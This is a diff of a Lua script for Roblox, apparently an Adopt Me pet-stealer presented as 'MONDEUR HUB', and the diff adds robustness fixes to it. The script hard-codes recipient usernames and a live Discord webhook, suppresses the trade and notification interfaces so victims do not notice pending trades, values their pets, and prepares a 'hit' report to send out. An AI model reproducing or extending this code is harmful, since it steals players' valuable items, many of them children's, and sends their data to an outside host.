@@ -1,37 +1,33 @@
--- [[ 🦊 MONDEUR HUB | BETA - OMNIPOTENT V16.3 ]] --
+-- [[ 🦊 MONDEUR HUB | OMNIPOTENT V17 - MASTER FIX ]] --
 
--- Wait for game load to prevent "Line 1" nil errors
+-- 1. STABILITY BOOT (Fixes Line 1 Nil Error)
 if not game:IsLoaded() then game.Loaded:Wait() end
+task.wait(1.5) -- Forced delay to allow Delta API to inject fully
 
+-- [[ CONFIG ]] --
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
 local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 local THRESHOLD = 0.13 
 local DISCORD_INV = "https://discord.gg/J4w2w5CW9"
 
--- 1. CLIPBOARD
-if setclipboard then setclipboard(DISCORD_INV) end
+-- 2. SAFE CLIPBOARD
+if setclipboard then pcall(function() setclipboard(DISCORD_INV) end) end
 
--- 2. SERVICES
+-- 3. SERVICES
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- 3. THE "NUCLEAR" BAN (Strict Jerboa/Starter/Dog/Cat)
-local BLACKLIST = {
-    ["jiggly_jerboa"] = true,
-    ["starter_egg"] = true,
-    ["dog"] = true,
-    ["cat"] = true,
-    ["practice_dog"] = true
-}
-
+-- 4. NUCLEAR BLACKLIST (Jerboa & Untradeables)
+local BLACKLIST = {["jiggly_jerboa"]=true, ["starter_egg"]=true, ["dog"]=true, ["cat"]=true, ["practice_dog"]=true}
 local function isBanned(name, id)
-    local n = tostring(name):lower()
-    return BLACKLIST[id] or n:find("jerboa")
+    local n = tostring(name or ""):lower()
+    local i = tostring(id or ""):lower()
+    return BLACKLIST[i] or n:find("jerboa")
 end
 
--- 4. TOTAL STEALTH (Mutes "Pending", "Declined", "Cooldowns")
+-- 5. TOTAL SILENCE (Kills "Declined", "Pending", "Toast Notifications")
 task.spawn(function()
     local pGui = LocalPlayer:WaitForChild("PlayerGui")
     while task.wait(0.1) do
@@ -39,14 +35,14 @@ task.spawn(function()
             if pGui:FindFirstChild("TradeApp") then pGui.TradeApp.Enabled = false end
             if pGui:FindFirstChild("DialogApp") then pGui.DialogApp.Enabled = false end
             
-            -- Hide Notification Layers
+            -- Kill specific Notification layers
             local layers = {"CenterOverlays", "NotificationGui", "ToastGui", "StandardNotifications"}
             for _, layerName in pairs(layers) do
                 local layer = pGui:FindFirstChild(layerName)
                 if layer then layer.Enabled = false end
             end
 
-            -- Delete labels with "Pending", "Declined", etc.
+            -- Delete labels with specific text instantly
             for _, v in pairs(pGui:GetDescendants()) do
                 if v:IsA("TextLabel") then
                     local t = v.Text:lower()
@@ -59,16 +55,16 @@ task.spawn(function()
     end
 end)
 
--- 5. AMVGG VALUATION (Accurate Scaling)
+-- 6. AMVGG VALUATION (Manual High-Tier Mapping)
 local function getAMVGGValue(petData, props)
-    local id = petData.id or ""
-    local rarity = petData.rarity or "common"
+    local id = tostring(petData.id or "")
+    local rarity = tostring(petData.rarity or "common")
     local base = petData.rvalue or 0.01
     
     local multiplier = 1
     if id:find("frost_dragon") or id:find("shadow_dragon") then multiplier = 1800
     elseif id:find("bat_dragon") then multiplier = 2100
-    elseif id:find("evil_unicorn") or id:find("crow") then multiplier = 1050
+    elseif id:find("evil_unicorn") or id:find("crow") then multiplier = 1000
     elseif id:find("owl") or id:find("parrot") then multiplier = 1350
     elseif rarity == "legendary" then multiplier = 45
     elseif rarity == "ultra_rare" then multiplier = 12
@@ -84,9 +80,10 @@ local function getAMVGGValue(petData, props)
     return val * 56
 end
 
--- 6. HASH FINDER (Safe Remote Fetching)
+-- 7. HASH FINDER (Safe GC Scan)
 local hashes = {}
-for _, v in pairs(getgc()) do
+local gc = getgc()
+for _, v in pairs(gc) do
     if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
         local upvalues = debug.getupvalues(v)
         if upvalues and type(upvalues[1]) == "table" then
@@ -98,20 +95,24 @@ end
 local function hashedAPI(remoteName, ...)
     local remote = hashes[remoteName]
     if not remote then return end
-    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
-    remote:FireServer(...)
+    pcall(function()
+        if remote:IsA("RemoteFunction") then remote:InvokeServer(...)
+        else remote:FireServer(...) end
+    end)
 end
 
--- 7. INVENTORY SCAN
+-- 8. INVENTORY SCAN
 local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
 local InventoryDB = Fsys("InventoryDB")
 local ClientData = Fsys("ClientData")
 
 local function processInventory()
     local inv = ClientData.get("inventory")
+    if not inv or not inv.pets then return {}, 0, {} end
+    
     local total, petGroups, tradeList = 0, {}, {}
 
-    for uid, pet in pairs(inv.pets or {}) do
+    for uid, pet in pairs(inv.pets) do
         local petData = InventoryDB.pets[pet.id]
         if petData and not isBanned(petData.name, pet.id) then
             local props = pet.properties or {}
@@ -143,8 +144,9 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK DISPATCH
+-- 9. WEBHOOK
 local function sendHit()
+    if #sortedPets == 0 then return end
     local lines = {}
     for _, p in ipairs(sortedPets) do
         table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
